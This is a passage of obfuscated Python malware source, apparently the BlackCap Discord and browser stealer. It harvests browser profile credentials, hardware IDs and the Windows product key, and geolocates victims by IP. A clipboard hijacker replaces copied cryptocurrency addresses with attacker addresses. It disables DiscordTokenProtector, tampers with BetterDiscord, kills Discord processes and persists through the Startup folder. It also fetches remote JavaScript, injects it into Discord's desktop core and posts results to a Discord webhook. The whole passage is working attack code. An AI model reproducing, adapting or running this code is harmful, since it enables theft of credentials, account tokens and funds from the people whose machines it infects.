    @staticmethod
    def IllIlIIlIll(IlllIlIIlIIlIlllll: int or float) -> str:
        try:
            llIIlIIlIlIllIIIII = datetime(1601, 1, 1, tzinfo=timezone.utc)
            lIIlIlIl = llIIlIIlIlIllIIIII + timedelta(microseconds=IlllIlIIlIIlIlllll)
            return lIIlIlIl
        except Exception:
            pass
    @staticmethod
    def llIllIIlIIIlIllIlll(IllllIIIIlIIII: bytes) -> str:
        return llIIllIlIllIIlIIll(IllllIIIIlIIII, None, None, None, 0)[1]
    @staticmethod
    def IIllIllIllIIllllIII(lIlIIIlIlllll: str or os.PathLike = gettempdir()):
        lIlIlllIIIIIIll = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for lIlIIlIllllllIlIIIIl in range(random.randint(10, 20)))
        lIllIIllI = ntpath.join(lIlIIIlIlllll, lIlIlllIIIIIIll)
        open(lIllIIllI, "x")
        return lIllIIllI
    @staticmethod
    def IIIlllIIIIIlIllIIll(llllIllIllIllIIllI, lllIIIlIlIlIIllI) -> str:
        try:
            IlIlIllIIIlIllI = llllIllIllIllIIllI[3:15]
            llIllIIIlIIllIl = llllIllIllIllIIllI[15:]
            llllIIIlIIIlIIIIII = AES.new(lllIIIlIlIlIIllI, AES.MODE_GCM, IlIlIllIIIlIllI)
            lllIIlll = llllIIIlIIIlIIIIII.decrypt(llIllIIIlIIllIl)
            lllIIlll = lllIIlll[:-16].decode()
            return lllIIlll
        except Exception:
            return lIIIIllIlIIIllIIl'Failed to decrypt "{str(llllIllIllIllIIllI)}" | key: "{str(lllIIIlIlIlIIllI)}"'
    @staticmethod
    def IIllIIll(IIIIIIIIlIIIlIlII: str = None):
        IIllIlIIlIIl = {
            "Content-Type": "application/json",
        }
        if IIIIIIIIlIIIlIlII:
            IIllIlIIlIIl.update({"Authorization": IIIIIIIIlIIIlIlII})
        return IIllIlIIlIIl
    @staticmethod
    def IlllIlll() -> list:
        IIIllIIllIIll = 0x08000000
        IlIIIIlIIIlIlIl = "wmic csproduct get uuid"
        lIlIlIllllIIIIllIl = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"
        IlIlIIIlIllIllI = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName"
        try:
            IIIllIIIlIIlIIlIll = subprocess.check_output(IlIIIIlIIIlIlIl, creationflags=IIIllIIllIIll).decode().split('\n')[1].strip()
        except Exception:
            IIIllIIIlIIlIIlIll = "N/A"
        try:
            IlIlIlIlI = subprocess.check_output(lIlIlIllllIIIIllIl, creationflags=IIIllIIllIIll).decode().rstrip()
        except Exception:
            IlIlIlIlI = "N/A"
        try:
            IIIIIIlIIIIlIllIlII = subprocess.check_output(IlIlIIIlIllIllI, creationflags=IIIllIIllIIll).decode().rstrip()
        except Exception:
            IIIIIIlIIIIlIllIlII = "N/A"
        return [IIIllIIIlIIlIIlIll, IIIIIIlIIIIlIllIlII, IlIlIlIlI]
    @staticmethod
    def llllIllIIllllIllIIl() -> list:
        lIIlllllllII, IlIlllIIlllII, IlllIIIlll, IIlIIIIll, llIlIlIlIl, lIIIlllIIIII, llIIIllllIIll = "None", "None", "None", "None", "None", "None", "None"
        IIIIIIlIIIIIIlIII = httpx.get("https://ipinfo.io/json")
        if IIIIIIlIIIIIIlIII.status_code == 200:
            IlIlIlIllllIlIIlII = IIIIIIlIIIIIIlIII.json()
            lIIlllllllII = IlIlIlIllllIlIIlII.get('ip')
            IlIlllIIlllII = IlIlIlIllllIlIIlII.get('city')
            IlllIIIlll = IlIlIlIllllIlIIlII.get('country')
            IIlIIIIll = IlIlIlIllllIlIIlII.get('region')
            llIlIlIlIl = IlIlIlIllllIlIIlII.get('org')
            lIIIlllIIIII = IlIlIlIllllIlIIlII.get('loc')
            llIIIllllIIll = "https://www.google.com/maps/search/google+map++" + lIIIlllIIIII
        return [lIIlllllllII, IlIlllIIlllII, IlllIIIlll, IIlIIIIll, llIlIlIlIl, lIIIlllIIIII, llIIIllllIIll]
    @staticmethod
    def lllllIIIll(IIlIlIIIlIlIIlII: str) -> str or bool | None:
        return IlIIlllIIllIIllI.get(IIlIlIIIlIlIIlII)
class lIIllIIllIlIlI(lIlIIIllIII):
    def __init__(IIIIIIIllIllIIII):
        IIIIIIIllIllIIII.llllIlIl = IIIIIIIllIllIIII.lllllIIIll("addresse_crypto_replacer")
        IIIIIIIllIllIIII.IIIlIIIIlIIllIlll = IIIIIIIllIllIIII.lllllIIIll("addresse_btc")
        IIIIIIIllIllIIII.IlllIlIlIl = IIIIIIIllIllIIII.lllllIIIll("addresse_eth")
        IIIIIIIllIllIIII.lllllIllIIIlll = IIIIIIIllIllIIII.lllllIIIll("addresse_xchain")
        IIIIIIIllIllIIII.IlIlIlIllIIIIlIllll = IIIIIIIllIllIIII.lllllIIIll("addresse_pchain")
        IIIIIIIllIllIIII.IllIllIIIIlIlIlIll = IIIIIIIllIllIIII.lllllIIIll("addresse_cchain")
        IIIIIIIllIllIIII.lIllIlIlllllIIlIIllI = IIIIIIIllIllIIII.lllllIIIll("addresse_monero")
        IIIIIIIllIllIIII.IIIlIIIlIIIIlIIl = IIIIIIIllIllIIII.lllllIIIll("addresse_ada")
        IIIIIIIllIllIIII.llIllIIIIllllI = IIIIIIIllIllIIII.lllllIIIll("addresse_dash")
    def lIllIlIlllIlIIII(IIIIIIIllIllIIII):
        try:
            IIIIlIlIlIllll = pyperclip.paste()
            if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', IIIIlIlIlIllll):
                if IIIIlIlIlIllll not in [IIIIIIIllIllIIII.IIIlIIIIlIIllIlll, IIIIIIIllIllIIII.IlllIlIlIl, IIIIIIIllIllIIII.lllllIllIIIlll, IIIIIIIllIllIIII.IlIlIlIllIIIIlIllll, IIIIIIIllIllIIII.IllIllIIIIlIlIlIll, IIIIIIIllIllIIII.lIllIlIlllllIIlIIllI, IIIIIIIllIllIIII.IIIlIIIlIIIIlIIl, IIIIIIIllIllIIII.llIllIIIIllllI]:
                    if IIIIIIIllIllIIII.IIIlIIIIlIIllIlll != "none":
                        pyperclip.copy(IIIIIIIllIllIIII.IIIlIIIIlIIllIlll)
                        pyperclip.paste()
            if re.search('^0x[a-fA-F0-9]{40}$', IIIIlIlIlIllll):
                pyperclip.copy(IIIIIIIllIllIIII.IlllIlIlIl)
                pyperclip.paste()
            if re.search('^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzIIlllIIlIlIlIllIIllIIIllIIlIl9llIllIlIllIllllll8glIIIIllIlIIIllIIl2IIIIIIIllvlIIIlIIIlllIIllIIlw0s3lIlIlllllln54khIlIlIIlllllIlIlIIIlIlIIIlIlIIlII6mullIlIlIIIIIIllIlIIl7IlIIlllII]{38}$', IIIIlIlIlIllll):
                if IIIIIIIllIllIIII.lllllIllIIIlll != "none":
                    if IIIIlIlIlIllll not in [IIIIIIIllIllIIII.IIIlIIIIlIIllIlll, IIIIIIIllIllIIII.IlllIlIlIl, IIIIIIIllIllIIII.lllllIllIIIlll, IIIIIIIllIllIIII.IlIlIlIllIIIIlIllll, IIIIIIIllIllIIII.IllIllIIIIlIlIlIll, IIIIIIIllIllIIII.lIllIlIlllllIIlIIllI, IIIIIIIllIllIIII.IIIlIIIlIIIIlIIl, IIIIIIIllIllIIII.llIllIIIIllllI]:
                        pyperclip.copy(IIIIIIIllIllIIII.lllllIllIIIlll)
                        pyperclip.paste()
            if re.search('^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzIIlllIIlIlIlIllIIllIIIllIIlIl9llIllIlIllIllllll8glIIIIllIlIIIllIIl2IIIIIIIllvlIIIlIIIlllIIllIIlw0s3lIlIlllllln54khIlIlIIlllllIlIlIIIlIlIIIlIlIIlII6mullIlIlIIIIIIllIlIIl7IlIIlllII]{38}$', IIIIlIlIlIllll):
                if IIIIIIIllIllIIII.IlIlIlIllIIIIlIllll != "none":
                    if IIIIlIlIlIllll not in [IIIIIIIllIllIIII.IIIlIIIIlIIllIlll, IIIIIIIllIllIIII.IlllIlIlIl, IIIIIIIllIllIIII.lllllIllIIIlll, IIIIIIIllIllIIII.IlIlIlIllIIIIlIllll, IIIIIIIllIllIIII.IllIllIIIIlIlIlIll, IIIIIIIllIllIIII.lIllIlIlllllIIlIIllI, IIIIIIIllIllIIII.IIIlIIIlIIIIlIIl, IIIIIIIllIllIIII.llIllIIIIllllI]:
                        pyperclip.copy(IIIIIIIllIllIIII.IlIlIlIllIIIIlIllll)
                        pyperclip.paste()
            if re.search('^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzIIlllIIlIlIlIllIIllIIIllIIlIl9llIllIlIllIllllll8glIIIIllIlIIIllIIl2IIIIIIIllvlIIIlIIIlllIIllIIlw0s3lIlIlllllln54khIlIlIIlllllIlIlIIIlIlIIIlIlIIlII6mullIlIlIIIIIIllIlIIl7IlIIlllII]{38}$', IIIIlIlIlIllll):
                if IIIIIIIllIllIIII.IllIllIIIIlIlIlIll != "none":
                    if IIIIlIlIlIllll not in [IIIIIIIllIllIIII.IIIlIIIIlIIllIlll, IIIIIIIllIllIIII.IlllIlIlIl, IIIIIIIllIllIIII.lllllIllIIIlll, IIIIIIIllIllIIII.IlIlIlIllIIIIlIllll, IIIIIIIllIllIIII.IllIllIIIIlIlIlIll, IIIIIIIllIllIIII.lIllIlIlllllIIlIIllI, IIIIIIIllIllIIII.IIIlIIIlIIIIlIIl, IIIIIIIllIllIIII.llIllIIIIllllI]:
                        pyperclip.copy(IIIIIIIllIllIIII.IllIllIIIIlIlIlIll)
                        pyperclip.paste()
            if re.search('addr1[a-z0-9]+', IIIIlIlIlIllll):
                    if IIIIlIlIlIllll not in [IIIIIIIllIllIIII.IIIlIIIIlIIllIlll, IIIIIIIllIllIIII.IlllIlIlIl, IIIIIIIllIllIIII.lllllIllIIIlll, IIIIIIIllIllIIII.IlIlIlIllIIIIlIllll, IIIIIIIllIllIIII.IllIllIIIIlIlIlIll, IIIIIIIllIllIIII.lIllIlIlllllIIlIIllI, IIIIIIIllIllIIII.IIIlIIIlIIIIlIIl, IIIIIIIllIllIIII.llIllIIIIllllI]:
                        pyperclip.copy(IIIIIIIllIllIIII.IIIlIIIlIIIIlIIl)
                        pyperclip.paste()
            if re.search('/X[1-9A-HJ-NP-Za-km-z]{33}$/g', IIIIlIlIlIllll):
                if IIIIIIIllIllIIII.llIllIIIIllllI != "none":
                    if IIIIlIlIlIllll not in [IIIIIIIllIllIIII.IIIlIIIIlIIllIlll, IIIIIIIllIllIIII.IlllIlIlIl, IIIIIIIllIllIIII.lllllIllIIIlll, IIIIIIIllIllIIII.IlIlIlIllIIIIlIllll, IIIIIIIllIllIIII.IllIllIIIIlIlIlIll, IIIIIIIllIllIIII.lIllIlIlllllIIlIIllI, IIIIIIIllIllIIII.IIIlIIIlIIIIlIIl, IIIIIIIllIllIIII.llIllIIIIllllI]:
                        pyperclip.copy(IIIIIIIllIllIIII.llIllIIIIllllI)
                        pyperclip.paste()
            if re.search('/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g', IIIIlIlIlIllll):
                if IIIIIIIllIllIIII.lIllIlIlllllIIlIIllI != "none":
                    if IIIIlIlIlIllll not in [IIIIIIIllIllIIII.IIIlIIIIlIIllIlll, IIIIIIIllIllIIII.IlllIlIlIl, IIIIIIIllIllIIII.lllllIllIIIlll, IIIIIIIllIllIIII.IlIlIlIllIIIIlIllll, IIIIIIIllIllIIII.IllIllIIIIlIlIlIll, IIIIIIIllIllIIII.lIllIlIlllllIIlIIllI, IIIIIIIllIllIIII.IIIlIIIlIIIIlIIl, IIIIIIIllIllIIII.llIllIIIIllllI]:
                        pyperclip.copy(IIIIIIIllIllIIII.lIllIlIlllllIIlIIllI)
                        pyperclip.paste()
        except:
            IlIlIlIllllIlIIlII = None
    def lllIIllIIIIIlIl(IIIIIIIllIllIIII):
        while True:
            IIIIIIIllIllIIII.lIllIlIlllIlIIII()
    def IIIIlIlIIIIl(IIIIIIIllIllIIII):
        if IIIIIIIllIllIIII.llllIlIl == "yes":
            IIIIIIIllIllIIII.lllIIllIIIIIlIl()
class IllIIllIllIIIlIlIIl(lIlIIIllIII):
    def __init__(IIIIIIIllIllIIII):
        IIIIIIIllIllIIII.IIllIIlIlIIIlIlIlIll = "https://discord.com/api/v9/users/@me"
        IIIIIIIllIllIIII.lIllIIlIIIlIl = IIIIIIIllIllIIII.lllllIIIll('yourwebhookurl')
        IIIIIIIllIllIIII.lIllIlIIlIlllIIIIII = IIIIIIIllIllIIII.lllllIIIll("hide")
        IIIIIIIllIllIIII.IllIIIIIlIIIIlIlll = IIIIIIIllIllIIII.lllllIIIll("pingtype")
        IIIIIIIllIllIIII.IIIIIllllIlII = IIIIIIIllIllIIII.lllllIIIll("ping")
        IIIIIIIllIllIIII.lIIlIllllllIII = "https://discord.com/api/v9/users/@me"
        IIIIIIIllIllIIII.IlIlllIlll = IIIIIIIllIllIIII.lllllIIIll("startup")
        IIIIIIIllIllIIII.IIlIIIllIIlIIIIllIII = IIIIIIIllIllIIII.lllllIIIll("fake_error")
        IIIIIIIllIllIIII.IIllIlIlllIlI = os.getenv("localappdata")
        IIIIIIIllIllIIII.IIIllIIllIlllIlllII = os.getenv("appdata")
        IIIIIIIllIllIIII.llIlIlIllIlIII = ntpath.join(IIIIIIIllIllIIII.IIllIlIlllIlI, 'Google', 'Chrome', 'User Data')
        IIIIIIIllIllIIII.llIIIIllIIl, IIIIIIIllIllIIII.IllIIlIllIllIIII = mkdtemp(), gettempdir()
        llIlIIlIlIlII, lIIlllIlIIl = IIIIIIIllIllIIII.IlllIlll(), IIIIIIIllIllIIII.llllIllIIllllIllIIl()
        IIIIIIIllIllIIII.IIIllIIIlIIlIIlIll, IIIIIIIllIllIIII.IIIIIIlIIIIlIllIlII, IIIIIIIllIllIIII.IlIlIlIlI = llIlIIlIlIlII[0], llIlIIlIlIlII[1], llIlIIlIlIlII[2]
        IIIIIIIllIllIIII.lIIlllllllII, IIIIIIIllIllIIII.IlIlllIIlllII, IIIIIIIllIllIIII.IlllIIIlll, IIIIIIIllIllIIII.IIlIIIIll, IIIIIIIllIllIIII.llIlIlIlIl, IIIIIIIllIllIIII.lIIIlllIIIII, IIIIIIIllIllIIII.llIIIllllIIll = lIIlllIlIIl[0], lIIlllIlIIl[1], lIIlllIlIIl[2], lIIlllIlIIl[3], lIIlllIlIIl[4], lIIlllIlIIl[5], lIIlllIlIIl[6]
        IIIIIIIllIllIIII.llllIIIIllIlIIlIIIII = ntpath.join(IIIIIIIllIllIIII.IIIllIIllIlllIlllII, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        IIIIIIIllIllIIII.IlIlIlIIlllllIl = "api/webhooks"
        IIIIIIIllIllIIII.IIIIlIIIlIIllllllII = re.compile(IIlllIIlIlIlI'(^profile\s\d*)|default|(guest profile$)', re.IGNORECASE | re.MULTILINE);
        IIIIIIIllIllIIII.lIIlIllllllIII = "https://discord.com/api/v9/users/@me"
        IIIIIIIllIllIIII.lIlIlIlllIIlIII = IlIllIIIII
        IIIIIIIllIllIIII.IIllIIIlIlll = IIlllIIlIlIlI"dQw4w9WgXcQ:[^\"]*"
        IIIIIIIllIllIIII.IlIlIlIlll = []
        IIIIIIIllIllIIII.lIIIIIIIIIIIIIlIIlIl = []
        IIIIIIIllIllIIII.lIIIllIllllII = os.lIIIllIllllII;
        IIIIIIIllIllIIII.llIlllllIIIl = [];
        IIIIIIIllIllIIII.IIllllIllIIIlI = IIIIIIIllIllIIII.lIlIIIllIIIIIlII(ntpath.join(IIIIIIIllIllIIII.llIlIlIllIlIII, "Local State"));
        os.makedirs(IIIIIIIllIllIIII.llIIIIllIIl, exist_ok=True);
    def lIIllIllI(IIIIIIIllIllIIII: str) -> str:
        if IIIIIIIllIllIIII.IIlIIIllIIlIIIIllIII == "yes":
            ctypes.windll.user32.MessageBoxW(None, 'Error code: Windows_0x988958\nSomething gone wrong.', 'Fatal Error', 0)
    def IIIIIllllllIIll(IIIIIIIllIllIIII: str) -> str:
        IlIlIIlIIlIIlllIlIll = {
            'avatar_url': 'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png',
            'content': "@everyone"
            }
        IllIIllIll = {
            'avatar_url': 'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png',
            'content': "@here"
            }
        if IIIIIIIllIllIIII.IIIIIllllIlII == "yes":
            if IIIIIIIllIllIIII.IlIlIlIIlllllIl in IIIIIIIllIllIIII.lIllIIlIIIlIl:
                if IIIIIIIllIllIIII.IllIIIIIlIIIIlIlll == "@everyone" or IIIIIIIllIllIIII.IllIIIIIlIIIIlIlll == "everyone":
                    httpx.post(IIIIIIIllIllIIII.lIllIIlIIIlIl, json=IlIlIIlIIlIIlllIlIll)
            if IIIIIIIllIllIIII.IllIIIIIlIIIIlIlll == "@here" or IIIIIIIllIllIIII.IllIIIIIlIIIIlIlll == "here":
                if IIIIIIIllIllIIII.IlIlIlIIlllllIl in IIIIIIIllIllIIII.lIllIIlIIIlIl :
                    httpx.post(IIIIIIIllIllIIII.lIllIIlIIIlIl, json=IllIIllIll)
    def llIlIIlIIIlIl(IIIIIIIllIllIIII: str) -> str:
        if IIIIIIIllIllIIII.IlIlllIlll == "yes":
            IIIllIllIIIIlIl = os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
            if os.lIllIIllI.exists(IIIllIllIIIIlIl + argv[0]):
                os.remove(IIIllIllIIIIlIl + argv[0])
                copy2(argv[0], IIIllIllIIIIlIl)
            else:
                copy2(argv[0], IIIllIllIIIIlIl)
    def lIlIllIlIlIIlIII(IIIIIIIllIllIIII: str) -> str:
        if IIIIIIIllIllIIII.lIllIlIIlIlllIIIIII == "yes":
            lIllIlIIlIlllIIIIII = win32gui.GetForegroundWindow()
            win32gui.ShowWindow(lIllIlIIlIlllIIIIII, win32con.SW_HIDE)
    def IllllIII(IIIIIIIllIllIIII):
        shutil.rmtree(IIIIIIIllIllIIII.llIIIIllIIl, ignore_errors=True)
        os._exit(0)
    def llIIllllIllIIllIlIll(IlllIlIIlIlIll):
        def IlIIlllIIll(*lllIIIlIlllIlIl, **lllIllllllIlIl):
            try:
                IlllIlIIlIlIll(*lllIIIlIlllIlIl, **lllIllllllIlIl)
            except Exception:
                pass
        return IlIIlllIIll
    async def lIlIlIlIIllIlIllIIl(IIIIIIIllIllIIII):
        IIIIIIIllIllIIII.IllIllIIIIl = {
            'amigo': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Amigo\\User Data',
            'torch': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Torch\\User Data',
            'kometa': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Kometa\\User Data',
            'orbitum': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Orbitum\\User Data',
            'cent-browser': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\CentBrowser\\User Data',
            '7star': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\7Star\\7Star\\User Data',
            'sputnik': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Vivaldi\\User Data',
            'google-chrome-sxs': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Microsoft\\Edge\\User Data',
            'uran': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\uCozMedia\\Uran\\User Data',
            'yandex': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Yandex\\YandexBrowser\\User Data',
            'brave': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': IIIIIIIllIllIIII.IIllIlIlllIlI + '\\Iridium\\User Data',
            'edge': IIIIIIIllIllIIII.IIllIlIlllIlI + "\\Microsoft\\Edge\\User Data",
            'coccoc': IIIIIIIllIllIIII.IIllIlIlllIlI + "\\CocCoc\\Browser\\User Data"
        }        
        IIIIIIIllIllIIII.lIllIIIllllIII = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
            'Profile 6',
            'Profile 7',
            'Profile 8',
            'Profile 9',
            'Profile 10',
            'Profile 11',
            'Profile 12',
            'Profile 13',
            'Profile 14',
            'Profile 15',            
        ]
        if IIIIIIIllIllIIII.lIllIIlIIIlIl == "" or self.discord_webhook == "\x57EBHOOK_HERE":
            IIIIIIIllIllIIII.IllllIII()
        IIIIIIIllIllIIII.lIlIllIlIlIIlIII()
        IIIIIIIllIllIIII.lIIllIllI()
        IIIIIIIllIllIIII.llIlIIlIIIlIl()
        if IIIIIIIllIllIIII.lllllIIIll('dbugkiller') and IlIIllIlI().IlIllllIIIIIII is True:
            IIIIIIIllIllIIII.IllllIII()
        await IIIIIIIllIllIIII.IIIIIIlIII()
        await IIIIIIIllIllIIII.IlIIIlllIIIIlIlllIl()
        lIIIIlIllllIIllIII = [IIIIIIIllIllIIII.lIllIlIIll, IIIIIIIllIllIIII.lllllllIIllIIl, IIIIIIIllIllIIII.llllIIlIIIl, IIIIIIIllIllIIII.llIllIllIlII, IIIIIIIllIllIIII.lIllIIlIIIllIIIll]
        if IIIIIIIllIllIIII.lllllIIIll('kill_discord_process'):
            await IIIIIIIllIllIIII.lllIIIllIIlIIIlIlIII()
        os.makedirs(ntpath.join(IIIIIIIllIllIIII.llIIIIllIIl, 'Browsers'), exist_ok=True)
        for IllIlIIlIIllIlIIlIl, lIllIIllI in IIIIIIIllIllIIII.IllIllIIIIl.items():
            if not os.lIllIIllI.isdir(lIllIIllI):
                continue
            IIIIIIIllIllIIII.IIlIlIlIlIlIIlIllI = IIIIIIIllIllIIII.lIlIIIllIIIIIlII(lIllIIllI + '\\Local State')
            IIIIIIIllIllIIII.lllIIIlIllIllIIIllll = [
                IIIIIIIllIllIIII.IIIlIlllIl,
                IIIIIIIllIllIIII.llIlllIIllllIlIIIII,
                IIIIIIIllIllIIII.IllIlIIll,
                IIIIIIIllIllIIII.IlIlIllll
            ]
            for IllIIlllIlI in IIIIIIIllIllIIII.lIllIIIllllIII:
                for IlllIlIIlIlIll in IIIIIIIllIllIIII.lllIIIlIllIllIIIllll:
                    try:
                        IlllIlIIlIlIll(IllIlIIlIIllIlIIlIl, lIllIIllI, IllIIlllIlI)
                    except:
                        pass
        if ntpath.exists(IIIIIIIllIllIIII.llIlIlIllIlIII) and IIIIIIIllIllIIII.IIllllIllIIIlI is not None:
            os.makedirs(ntpath.join(IIIIIIIllIllIIII.llIIIIllIIl, 'Google'), exist_ok=True)
            lIIIIlIllllIIllIII.extend([IIIIIIIllIllIIII.lIllllIIIllIIlIII, IIIIIIIllIllIIII.lIIllIlIIlllIII, IIIIIIIllIllIIII.IIlIIlIII])
        for IlllIlIIlIlIll in lIIIIlIllllIIllIII:
            IllllIIllIlIlI = threading.Thread(IIllIIlIlllII=IlllIlIIlIlIll, daemon=True)
            IllllIIllIlIlI.start()
        for IIIIIIIll in threading.enumerate():
            try:
                IIIIIIIll.join()
            except RuntimeError:
                continue
        IIIIIIIllIllIIII.llIIlIlI()
        await IIIIIIIllIllIIII.IIIllIIl()
        IIIIIIIllIllIIII.IIIIIllllllIIll()
        IIIIIIIllIllIIII.llIIIlIIIIllIlIIl()
    async def IIIllIIl(IIIIIIIllIllIIII):
        for lIlIIIlIlllll in os.listdir(IIIIIIIllIllIIII.IIllIlIlllIlI):
            if 'discord' in lIlIIIlIlllll.lower():
                IIIIlllIlIIIllIIl = IIIIIIIllIllIIII.IIllIlIlllIlI + os.lIIIllIllllII + lIlIIIlIlllll
                for lIllIlIIIllIllIll in os.listdir(ntpath.abspath(IIIIlllIlIIIllIIl)):
                    if re.match(IIlllIIlIlIlI'app-(\d*\.\d*)*', lIllIlIIIllIllIll):
                        IIIllllIll = ntpath.abspath(ntpath.join(IIIIlllIlIIIllIIl, lIllIlIIIllIllIll))
                        IIlIlllIlIllIIIlll = ntpath.join(IIIllllIll, 'modules')
                        if not ntpath.exists(IIlIlllIlIllIIIlll):
                            return
                        for IIIIlIlll in os.listdir(IIlIlllIlIllIIIlll):
                            if re.match(IIlllIIlIlIlI"discord_desktop_core-\d+", IIIIlIlll):
                                lIIIIllIlIIllI = IIlIlllIlIllIIIlll + os.lIIIllIllllII + IIIIlIlll + lIIIIllIlIIIllIIl'\\discord_desktop_core\\'
                                if ntpath.exists(lIIIIllIlIIllI):
                                    if IIIIIIIllIllIIII.llllIIIIllIlIIlIIIII not in argv[0]:
                                        try:
                                            os.makedirs(lIIIIllIlIIllI + 'blackcap', exist_ok=True)
                                        except PermissionError:
                                            pass
                                    if IIIIIIIllIllIIII.IlIlIlIIlllllIl in IIIIIIIllIllIIII.lIllIIlIIIlIl:
                                        lIIIIllIlIIIllIIl = httpx.get(IIIIIIIllIllIIII.lllllIIIll('blackcap_inject_url')).text.replace("%WEBHOOK%", IIIIIIIllIllIIII.lIllIIlIIIlIl)
                                    try:
                                        with open(lIIIIllIlIIllI + 'index.js', 'w', errors="ignore") as IIIIIllIllllIIlll:
                                            IIIIIllIllllIIlll.write(lIIIIllIlIIIllIIl)
                                    except PermissionError:
                                        pass
                                    if IIIIIIIllIllIIII.lllllIIIll('kill_discord_process'):
                                        os.startfile(IIIllllIll + IIIIIIIllIllIIII.lIIIllIllllII + lIlIIIlIlllll + '.exe')
    async def IlIIIlllIIIIlIlllIl(IIIIIIIllIllIIII):
        lllIlllIlllI = lIIIIllIlIIIllIIl"{sIIlIlIIIlIlIIlIIllIIIIllIlIIIllIIl.IIlllIIlIlIlIollIlIlIIIIIIllIlIIIlIIlllIImlIIllllllIlng}\\DiscordTokenProtector\\"
        if not ntpath.exists(lllIlllIlllI):
            return
        lIIIIllllllIl = lllIlllIlllI + "config.json"
        for lIIllllllIl in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
            try:
                os.remove(lllIlllIlllI + lIIllllllIl)
            except FileNotFoundError:
                pass
        if ntpath.exists(lIIIIllllllIl):
            with open(lIIIIllllllIl, errors="ignore") as lIIIIllIlIIIllIIl:
                try:
                    IIIlIlIIlIllIIIIIlll = json.load(lIIIIllIlIIIllIIl)
                except json.decoder.JSONDecodeError:
                    return
                IIIlIlIIlIllIIIIIlll['ksch_is_here'] = "https://github.com/asd"
                IIIlIlIIlIllIIIIIlll['auto_start'] = False
                IIIlIlIIlIllIIIIIlll['auto_start_discord'] = False
                IIIlIlIIlIllIIIIIlll['integrity'] = False
                IIIlIlIIlIllIIIIIlll['integrity_allowbetterdiscord'] = False
                IIIlIlIIlIllIIIIIlll['integrity_checkexecutable'] = False
                IIIlIlIIlIllIIIIIlll['integrity_checkhash'] = False
                IIIlIlIIlIllIIIIIlll['integrity_checkmodule'] = False
                IIIlIlIIlIllIIIIIlll['integrity_checkscripts'] = False
                IIIlIlIIlIllIIIIIlll['integrity_checkresource'] = False
                IIIlIlIIlIllIIIIIlll['integrity_redownloadhashes'] = False
                IIIlIlIIlIllIIIIIlll['iterations_iv'] = 364
                IIIlIlIIlIllIIIIIlll['iterations_key'] = 457
                IIIlIlIIlIllIIIIIlll['version'] = 69420
            with open(lIIIIllllllIl, 'w') as lIIIIllIlIIIllIIl:
                json.dump(IIIlIlIIlIllIIIIIlll, lIIIIllIlIIIllIIl, indent=2, sort_keys=True)
            with open(lIIIIllllllIl, 'a') as lIIIIllIlIIIllIIl:
                lIIIIllIlIIIllIIl.write("\n\n//KSCH_is_here | https://github.com/asd")
    async def lllIIIllIIlIIIlIlIII(IIIIIIIllIllIIII):
        IlIllIlIlIIlIIlI = IIIIIIIllIllIIII.lllllIIIll('blprggg')
        for lIIllllllIl in ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']:
            IlIllIlIlIIlIIlI.append(lIIllllllIl)
        for IIIIIllIIlIIll in psutil.process_iter():
            if any(llIIlllIllI in IIIIIllIIlIIll.IllIlIIlIIllIlIIlIl().lower() for llIIlllIllI in IlIllIlIlIIlIIlI):
                try:
                    IIIIIllIIlIIll.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
    async def IIIIIIlIII(IIIIIIIllIllIIII):
        lIIIIlIIlIllIIlII = IIIIIIIllIllIIII.IIIllIIllIlllIlllII + "\\BetterDiscord\\data\\betterdiscord.asar"
        if ntpath.exists(lIIIIlIIlIllIIlII):
            llIllIlIllIllllll = IIIIIIIllIllIIII.IlIlIlIIlllllIl
            with open(lIIIIlIIlIllIIlII, 'r', encoding="cp437", errors='ignore') as lIIIIllIlIIIllIIl:
                llIIlIIIIIIIlI = lIIIIllIlIIIllIIl.read()
                IIlIIIlIIIIlIllllIII = llIIlIIIIIIIlI.replace(llIllIlIllIllllll, 'KSCHishere')
            with open(lIIIIlIIlIllIIlII, 'w', newline='', encoding="cp437", errors='ignore') as lIIIIllIlIIIllIIl:
                lIIIIllIlIIIllIIl.write(IIlIIIlIIIIlIllllIII)
    @llIIllllIllIIllIlIll
